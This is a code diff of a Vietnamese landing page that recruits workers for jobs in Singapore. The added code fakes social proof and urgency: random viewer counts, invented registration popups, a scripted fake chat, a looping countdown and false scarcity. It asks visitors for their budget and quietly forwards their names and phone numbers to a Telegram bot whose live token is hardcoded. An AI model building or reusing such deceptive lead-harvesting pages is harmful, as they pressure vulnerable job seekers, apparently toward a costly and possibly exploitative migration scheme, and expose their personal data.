@@ -6,19 +6,116 @@
 <title>Việc Làm Singapore 24H</title>
 
 <style>
-body {margin:0;font-family:Arial;background:#f5f7fb;}
-.header {background:linear-gradient(45deg,#d60000,#ff3c3c);color:white;text-align:center;padding:50px 20px;}
-.header h1{margin:0;font-size:36px;}
-.btn{display:inline-block;margin-top:20px;padding:12px 25px;background:linear-gradient(45deg,#ffd700,#ffae00);color:black;font-weight:bold;border-radius:30px;text-decoration:none;}
-.section{padding:40px 20px;text-align:center;}
-.jobs{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:15px;}
-.job{background:white;padding:10px;border-radius:15px;box-shadow:0 5px 15px rgba(0,0,0,0.1);}
-.gallery{display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:10px;}
-.gallery img{width:100%;height:250px;object-fit:cover;border-radius:10px;}
-.call-btn{position:fixed;bottom:20px;right:20px;background:red;color:white;padding:15px;border-radius:50%;}
-.zalo-btn{position:fixed;bottom:80px;right:20px;background:#0084ff;color:white;padding:15px;border-radius:50%;}
-.footer{background:#111;color:white;text-align:center;padding:20px;}
-html{scroll-behavior:smooth;}
+body {
+  margin:0;
+  font-family: Arial;
+  background:#f5f7fb;
+}
+
+/* HEADER */
+.header {
+  background: linear-gradient(45deg,#d60000,#ff3c3c);
+  color:white;
+  text-align:center;
+  padding:50px 20px;
+}
+
+.header h1 {margin:0;font-size:36px;}
+
+/* BUTTON */
+.btn {
+  display:inline-block;
+  margin-top:20px;
+  padding:12px 25px;
+  background:linear-gradient(45deg,#ffd700,#ffae00);
+  color:black;
+  font-weight:bold;
+  border-radius:30px;
+  text-decoration:none;
+  transition:0.3s;
+}
+.btn:hover {
+  transform:scale(1.1);
+}
+
+/* SECTION */
+.section {
+  padding:40px 20px;
+  text-align:center;
+}
+
+/* JOB */
+.jobs {
+  display:grid;
+  grid-template-columns:repeat(auto-fit,minmax(200px,1fr));
+  gap:15px;
+}
+
+.job {
+  background:white;
+  padding:10px;
+  border-radius:15px;
+  box-shadow:0 5px 15px rgba(0,0,0,0.1);
+  transition:0.3s;
+}
+
+.job:hover {
+  transform:translateY(-7px);
+  box-shadow:0 15px 30px rgba(0,0,0,0.2);
+}
+
+.job img {
+  width:100%;
+  height:150px;
+  object-fit:cover;
+  border-radius:10px;
+}
+
+/* GALLERY */
+.gallery {
+  display:grid;
+  grid-template-columns:repeat(auto-fit,minmax(250px,1fr));
+  gap:10px;
+}
+
+.gallery img {
+  width:100%;
+  height:250px;
+  object-fit:cover;
+  border-radius:10px;
+}
+
+/* FLOAT BUTTON */
+.call-btn {
+  position:fixed;
+  bottom:20px;
+  right:20px;
+  background:red;
+  color:white;
+  padding:15px;
+  border-radius:50%;
+}
+
+.zalo-btn {
+  position:fixed;
+  bottom:80px;
+  right:20px;
+  background:#0084ff;
+  color:white;
+  padding:15px;
+  border-radius:50%;
+}
+
+/* FOOTER */
+.footer {
+  background:#111;
+  color:white;
+  text-align:center;
+  padding:20px;
+}
+
+/* SMOOTH */
+html {scroll-behavior:smooth;}
 </style>
 </head>
 
@@ -29,9 +126,9 @@ html{scroll-behavior:smooth;}
 </div>
 
 <div class="header">
-<h1>VIỆC LÀM SINGAPORE 24H</h1>
-<p>Uy tín - Nhanh chóng - Thu nhập cao</p>
-<a href="#form" class="btn">Đăng ký ngay</a>
+  <h1>VIỆC LÀM SINGAPORE 24H</h1>
+  <p>Uy tín - Nhanh chóng - Thu nhập cao</p>
+  <a href="#form" class="btn">Đăng ký ngay</a>
 </div>
 
 <div style="text-align:center;color:red;font-weight:bold;margin-top:10px;">
@@ -40,32 +137,184 @@ html{scroll-behavior:smooth;}
 
 <script>
 setInterval(()=>{
-document.getElementById("viewers").innerText=Math.floor(Math.random()*20)+20;
+  document.getElementById("viewers").innerText =
+  Math.floor(Math.random()*20)+20;
 },3000);
 </script>
 
+<!-- JOB -->
 <div class="section">
-<h2>🔥 Công việc đang tuyển</h2>
-<div class="jobs">
-<div class="job">Phụ bếp</div>
-<div class="job">Phục vụ</div>
-<div class="job">Spa</div>
-<div class="job">Xây dựng</div>
-</div>
+  <h2>🔥 Công việc đang tuyển</h2>
+  <div class="jobs">
+    <div class="job"><img src="phubep.jpg"><p>Phụ bếp</p></div>
+    <div class="job"><img src="phucvu.jpg"><p>Phục vụ nhà hàng</p></div>
+    <div class="job"><img src="massage.jpg"><p>Massage</p></div>
+    <div class="job"><img src="nail.jpg"><p>Spa - Nail - Mi</p></div>
+    <div class="job"><img src="ruabat.jpg"><p>Rửa bát</p></div>
+    <div class="job"><img src="moc.jpg"><p>Mộc nội thất</p></div>
+    <div class="job"><img src="dondep.jpg"><p>Dọn dẹp khách sạn</p></div>
+    <div class="job"><img src="xaydung.jpg"><p>Xây dựng</p></div>
+  </div>
 </div>
 
-<div class="section" id="form">
-<h2>📩 Đăng ký tư vấn miễn phí</h2>
+<!-- VISA -->
+<div class="section">
+  <h2>🛂 Visa hỗ trợ</h2>
+  <p>SPass - WP - TEP</p>
+</div>
 
-<form action="https://formspree.io/f/xpqogqva" method="POST">
+<!-- INFO -->
+<div class="section">
+  <h2>🇸🇬 Những điều cần biết</h2>
+  <p>✔ Tuổi 18-45, sức khỏe tốt</p>
+  <p>✔ Lương 30 - 45 triệu/tháng</p>
+  <p>✔ Có tăng ca, thưởng</p>
+  <p>✔ Hợp đồng rõ ràng</p>
+
+  <!-- CAM KẾT -->
+  <div style="background:#fff;border-radius:15px;padding:20px;margin-top:20px;box-shadow:0 5px 15px rgba(0,0,0,0.1);">
+    <h3>✅ Cam kết của chúng tôi</h3>
+    <p>✔ Có hợp đồng rõ ràng trước khi đi</p>
+    <p>✔ Không phát sinh chi phí</p>
+    <p>✔ Hỗ trợ đến khi có việc</p>
+    <p>✔ Minh bạch - uy tín</p>
+  </div>
+</div>
+
+<!-- NGOẠI NGỮ -->
+<div class="section" style="background:#e6f7ff;border-radius:15px;margin:20px;">
+  <h2>📚 Đào tạo ngoại ngữ trước khi xuất cảnh</h2>
+  <p>✔ Hỗ trợ đào tạo tiếng Trung & tiếng Anh</p>
+  <p>✔ Học từ cơ bản đến giao tiếp</p>
+  <p>✔ Tăng cơ hội trúng tuyển đơn lương cao</p>
+</div>
+
+<!-- LÝ DO -->
+<div class="section">
+  <h2>🎯 Vì sao nên đi Singapore ngay?</h2>
+  <p>✔ Lương cao hơn Việt Nam 2-3 lần</p>
+  <p>✔ Cơ hội đổi đời nhanh</p>
+  <p>✔ Nhiều người đã thành công</p>
+</div>
+
+<!-- CTA -->
+<div class="section" style="background:#fff3cd;border-radius:15px;margin:20px;">
+  <h2 style="color:red;">🔥 ĐĂNG KÝ NGAY - SỐ LƯỢNG CÓ HẠN</h2>
+  <p>⚠️ Mỗi tháng chỉ nhận 50 hồ sơ</p>
+  <a href="#form" class="btn">GIỮ SUẤT NGAY</a>
+</div>
+
+<!-- FEEDBACK -->
+<div class="section">
+  <h2>💬 Khách hàng nói gì</h2>
+  <p>⭐⭐⭐⭐⭐ "Đi nhanh, uy tín" – Anh Nam</p>
+  <p>⭐⭐⭐⭐⭐ "Có việc ngay" – Chị Hương</p>
+</div>
+
+<!-- COUNTDOWN -->
+<div class="section" style="background:#000;color:white;border-radius:15px;margin:20px;">
+  <h2>⏰ Ưu đãi kết thúc sau:</h2>
+  <h1 id="countdown">10:00</h1>
+</div>
+
+<script>
+let time = 600;
+setInterval(()=>{
+  let m = Math.floor(time/60);
+  let s = time%60;
+  document.getElementById("countdown").innerText =
+    m + ":" + (s<10?"0":"") + s;
+  if(time>0) time--;
+},1000);
+</script>
+
+<!-- CẢNH BÁO -->
+<div class="section" style="background:#ffe6e6;border-radius:15px;margin:20px;">
+  <h2 style="color:red;">⚠️ Cảnh báo lừa đảo</h2>
+  <p>❌ Không chuyển tiền khi chưa có hợp đồng</p>
+  <p>✔ Cam kết minh bạch</p>
+</div>
+
+<!-- GALLERY -->
+<div class="section">
+  <h2>📸 Hình ảnh thực tế</h2>
+  <div class="gallery">
+    <img src="anh1.jpg">
+    <img src="anh2.jpg">
+    <img src="anh3.jpg">
+    <img src="anh4.jpg">
+    <img src="anh5.jpg">
+  </div>
+</div>
+
+<!-- QUY TRÌNH -->
+<div class="section">
+  <h2>📋 Quy trình đi Singapore</h2>
+  <p>1️⃣ Đăng ký tư vấn</p>
+  <p>2️⃣ Chọn đơn phù hợp</p>
+  <p>3️⃣ Đào tạo (nếu cần)</p>
+  <p>4️⃣ Ký hợp đồng</p>
+  <p>5️⃣ Xuất cảnh</p>
+</div>
+
+<!-- FORM -->
+<div class="section" id="form" style="background:#ffffff;border-radius:15px;margin:20px;box-shadow:0 5px 15px rgba(0,0,0,0.1);">
+
+<div style="background:#ff0000;color:white;padding:15px;border-radius:10px;margin-bottom:15px;">
+<b>⚠️ CHỈ CÒN 7 SUẤT CUỐI HÔM NAY</b><br>
+⏳ Đăng ký ngay để giữ chỗ
+</div>
+
+<h2 style="color:#d60000;">📩 Đăng ký tư vấn miễn phí</h2>
+
+<form id="leadForm" action="https://formspree.io/f/xpqogqva" method="POST">
+
 <input type="text" name="name" placeholder="Họ và tên" required style="width:90%;padding:12px;margin:8px;">
+
 <input type="text" name="phone" placeholder="Số điện thoại" required style="width:90%;padding:12px;margin:8px;">
-<button type="submit" style="width:95%;padding:12px;background:red;color:white;">🚀 Gửi ngay</button>
+
+<select name="job" style="width:90%;padding:12px;margin:8px;">
+<option>Chọn công việc</option>
+<option>Phụ bếp</option>
+<option>Phục vụ</option>
+<option>Spa - Nail</option>
+<option>Xây dựng</option>
+<option>Rửa bát</option>
+<option>Khách sạn</option>
+<option>Massage</option>
+<option>Làm tóc</option>
+<option>Bán hàng</option>
+<option>Mộc nội thất</option>
+</select>
+
+<select name="budget" style="width:90%;padding:12px;margin:8px;">
+<option>Khả năng tài chính</option>
+<option>20 - 50 triệu</option>
+<option>50 - 100 triệu</option>
+<option>Trên 100 triệu</option>
+</select>
+
+<button type="submit" style="width:95%;padding:14px;background:red;color:white;font-weight:bold;border:none;">
+🚀 ĐĂNG KÝ NGAY
+</button>
+
 </form>
 
 </div>
 
-<div id="popup" style="position:fixed;bottom:20px;left:20px;background:white;padding:15px;border-radius:10px;display:none;">
+<!-- POPUP -->
+<div id="popup" style="
+position:fixed;
+bottom:20px;
+left:20px;
+background:white;
+padding:15px;
+border-radius:10px;
+box-shadow:0 5px 15px rgba(0,0,0,0.3);
+display:none;
+max-width:250px;
+z-index:999;
+">
 🔥 Có người vừa đăng ký
 </div>
 
@@ -81,79 +330,290 @@ document.getElementById("popup").innerHTML="🔥 "+names[Math.floor(Math.random(
 <a href="https://zalo.me/0369759879" class="zalo-btn">💬</a>
 
 <div class="footer">
-<p>Hotline: 0369759879</p>
+  <p>Hotline: 0369759879</p>
+  <p>1000+ người đã xuất cảnh</p>
+</div>
+<!-- ================= AUTO CHỐT KHÁCH LEVEL MAX ================= -->
+
+<!-- CHAT BOX GIẢ -->
+<div id="chatbox" style="
+position:fixed;
+bottom:90px;
+right:20px;
+width:260px;
+background:white;
+border-radius:10px;
+box-shadow:0 5px 15px rgba(0,0,0,0.3);
+overflow:hidden;
+font-size:14px;
+z-index:999;
+">
+
+<div style="background:#0084ff;color:white;padding:10px;">
+💬 Tư vấn nhanh
 </div>
 
-<!-- TELEGRAM -->
+<div id="chat-content" style="padding:10px;height:150px;overflow-y:auto;">
+</div>
+
+<div style="display:flex;border-top:1px solid #ddd;">
+<input id="chat-input" placeholder="Nhập câu hỏi..." style="flex:1;padding:8px;border:none;">
+<button onclick="sendMsg()" style="background:#0084ff;color:white;border:none;padding:8px;">Gửi</button>
+</div>
+
+</div>
+
+<script>
+// FAKE CHAT AUTO
+const messages = [
+"Chào bạn 👋",
+"Bạn muốn đi Singapore phải không?",
+"Bên mình đang có đơn lương 40tr+",
+"Bạn để lại SĐT để mình gọi tư vấn nhé 🔥"
+];
+
+let i=0;
+setInterval(()=>{
+let box = document.getElementById("chat-content");
+if(box && i < messages.length){
+box.innerHTML += "<div>"+messages[i]+"</div>";
+box.scrollTop = box.scrollHeight;
+i++;
+}
+},2000);
+
+// USER CHAT
+function sendMsg(){
+let input = document.getElementById("chat-input");
+let box = document.getElementById("chat-content");
+if(input.value.trim() !== ""){
+box.innerHTML += "<div style='text-align:right;color:blue;'>"+input.value+"</div>";
+box.innerHTML += "<div>👉 Để lại SĐT ở form bên dưới nhé</div>";
+input.value="";
+box.scrollTop = box.scrollHeight;
+}
+}
+</script>
+
+<!-- AUTO SCROLL VỀ FORM -->
+<script>
+setTimeout(()=>{
+let form = document.getElementById("form");
+if(form){
+form.scrollIntoView({behavior:"smooth"});
+}
+},15000);
+</script>
+
+<!-- RUNG NÚT GỌI -->
+<style>
+.call-btn{
+animation: rung2 1s infinite;
+}
+@keyframes rung2{
+0%{transform:scale(1)}
+50%{transform:scale(1.2)}
+100%{transform:scale(1)}
+}
+</style>
+
+<!-- NOTIFY ÂM THANH -->
+<audio id="ding" src="https://www.soundjay.com/buttons/sounds/button-3.mp3"></audio>
+
+<script>
+setInterval(()=>{
+let audio=document.getElementById("ding");
+if(audio) audio.play();
+},20000);
+</script>
+
+<!-- ====== NÂNG CẤP AUTO CHỐT KHÁCH PRO MAX ====== -->
 <script>
 (function(){
 
-const TOKEN="YOUR_TOKEN";
-const CHAT_ID="YOUR_CHAT_ID";
-const form=document.querySelector("form");
+const TOKEN = "8791606831:AAF03TxBZoCOY4NNJXgiGTndV6PW1KDxvdY";
+const CHAT_ID = "5102693667";
 
-let isSending=false;
+const form = document.getElementById("leadForm");
 
-form.addEventListener("submit",function(e){
+let isSending = false; // 👉 thêm dòng này
 
-if(isSending) return;
-isSending=true;
+if(form){
 
-e.preventDefault();
+  form.addEventListener("submit", function(e){
 
-let name=form.querySelector("input[name='name']").value;
-let phone=form.querySelector("input[name='phone']").value;
+    if(isSending) return; // 👉 thêm dòng này
+    isSending = true;
 
-fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`,{
-method:"POST",
-headers:{"Content-Type":"application/json"},
-body:JSON.stringify({
-chat_id:CHAT_ID,
-text:"🔥 KHÁCH MỚI\n👤 "+name+"\n📱 "+phone
-})
-});
+    e.preventDefault(); // chặn reload
 
-// popup
-setTimeout(()=>{
-document.body.innerHTML+=`
-<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.7);display:flex;justify-content:center;align-items:center;">
-<div style="background:white;padding:30px;text-align:center;">
-<h2>🎉 Thành công</h2>
-<p>Sẽ gọi cho bạn ngay</p>
-<button onclick="location.reload()">OK</button>
-</div>
-</div>`;
-},300);
+    const name = form.querySelector("input[name='name']").value;
+    const phone = form.querySelector("input[name='phone']").value;
 
-// submit lại
-setTimeout(()=>{form.submit()},1200);
+    const text = "🔥 KHÁCH MỚI\n\n👤 " + name + "\n📱 " + phone + "\n🌐 Website";
 
-});
+    // Gửi Telegram
+    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: {"Content-Type": "application/json"},
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: text
+      })
+    });
+
+    // Popup nâng cấp
+    setTimeout(()=>{
+      document.body.innerHTML += `
+      <div style="
+      position:fixed;
+      top:0;left:0;width:100%;height:100%;
+      background:rgba(0,0,0,0.75);
+      display:flex;justify-content:center;align-items:center;
+      z-index:99999;
+      ">
+      <div style="
+      background:white;
+      padding:30px;
+      border-radius:15px;
+      text-align:center;
+      max-width:320px;
+      animation:scaleIn 0.3s ease;
+      ">
+      <h2 style="color:red;">🎉 Đăng ký thành công!</h2>
+      <p>Bên mình sẽ gọi cho bạn trong 5 phút 🔥</p>
+      <p style="color:green;font-weight:bold;">✔ Giữ máy để không lỡ cuộc gọi</p>
+      <button onclick="location.reload()" 
+      style="margin-top:10px;padding:10px 20px;background:red;color:white;border:none;border-radius:8px;">
+      OK
+      </button>
+      </div>
+      </div>
+
+      <style>
+      @keyframes scaleIn{
+        from{transform:scale(0.7);opacity:0;}
+        to{transform:scale(1);opacity:1;}
+      }
+      </style>
+      `;
+    },300);
+
+    // submit lại form sau khi gửi telegram
+    setTimeout(()=>{
+      form.submit();
+    },1200);
+
+  });
+
+}
 
 })();
+</script>
+<!-- ====== END NÂNG CẤP ====== -->
+<!-- ================= END ================= -->
+  <!-- ====== LEVEL MAX UPGRADE ====== -->
+
+<!-- FAKE LOCATION NOTIFY -->
+<script>
+const cities = ["Hà Nội","TP.HCM","Đà Nẵng","Bắc Ninh","Hải Phòng","Thanh Hóa"];
+
+setInterval(()=>{
+  const names = ["Nam","Huy","Linh","Tuấn","Hà","Dũng"];
+  const city = cities[Math.floor(Math.random()*cities.length)];
+  const name = names[Math.floor(Math.random()*names.length)];
+
+  let popup = document.getElementById("popup");
+  if(popup){
+    popup.innerHTML = `🔥 ${name} (${city}) vừa đăng ký`;
+  }
+},7000);
+</script>
+
+<!-- PROGRESS BAR FOMO -->
+<div id="fomo-bar" style="
+position:fixed;
+top:0;
+left:0;
+height:5px;
+background:red;
+width:10%;
+z-index:9999;
+"></div>
+
+<script>
+let progress = 10;
+setInterval(()=>{
+  if(progress < 95){
+    progress += Math.random()*5;
+    document.getElementById("fomo-bar").style.width = progress + "%";
+  }
+},3000);
 </script>
 
 <!-- EXIT POPUP -->
 <script>
-let showed=false;
+let showed = false;
 
-document.addEventListener("mouseout",function(e){
-if(e.clientY<10 && !showed){
-showed=true;
+document.addEventListener("mouseout", function(e){
+  if(e.clientY < 10 && !showed){
+    showed = true;
 
-document.body.innerHTML+=`
-<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.7);display:flex;justify-content:center;align-items:center;">
-<div style="background:white;padding:25px;text-align:center;">
-<h2>⚠️ ĐỪNG BỎ LỠ!</h2>
-<p>Chỉ còn vài suất cuối hôm nay 🔥</p>
-<button onclick="document.getElementById('form').scrollIntoView();this.parentElement.parentElement.remove();">
-GIỮ SUẤT NGAY
-</button>
-</div>
-</div>`;
-}
+    document.body.innerHTML += `
+    <div style="
+    position:fixed;
+    top:0;left:0;width:100%;height:100%;
+    background:rgba(0,0,0,0.7);
+    display:flex;justify-content:center;align-items:center;
+    z-index:999999;
+    ">
+    <div style="background:white;padding:25px;border-radius:15px;text-align:center;">
+      <h2 style="color:red;">⚠️ ĐỪNG BỎ LỠ!</h2>
+      <p>Chỉ còn vài suất cuối hôm nay 🔥</p>
+      <button onclick="
+      document.getElementById('form').scrollIntoView({behavior:'smooth'});
+      this.parentElement.parentElement.remove();
+      " 
+      style="padding:10px 20px;background:red;color:white;border:none;">
+      GIỮ SUẤT NGAY
+      </button>
+    </div>
+    </div>
+    `;
+  }
 });
 </script>
 
+<!-- AUTO FOCUS FORM -->
+<script>
+setTimeout(()=>{
+  const input = document.querySelector("input[name='name']");
+  if(input){
+    input.focus();
+  }
+},8000);
+</script>
+
+<!-- BUTTON SHAKE FORM -->
+<style>
+button[type="submit"]{
+animation: shake 1.5s infinite;
+}
+@keyframes shake{
+0%{transform:scale(1)}
+50%{transform:scale(1.05)}
+100%{transform:scale(1)}
+}
+</style>
+
+<!-- TRACK USER SCROLL -->
+<script>
+window.addEventListener("scroll", ()=>{
+  let scroll = window.scrollY;
+  console.log("User scroll:", scroll);
+});
+</script>
+
+<!-- ====== END LEVEL MAX ====== -->
 </body>
 </html>
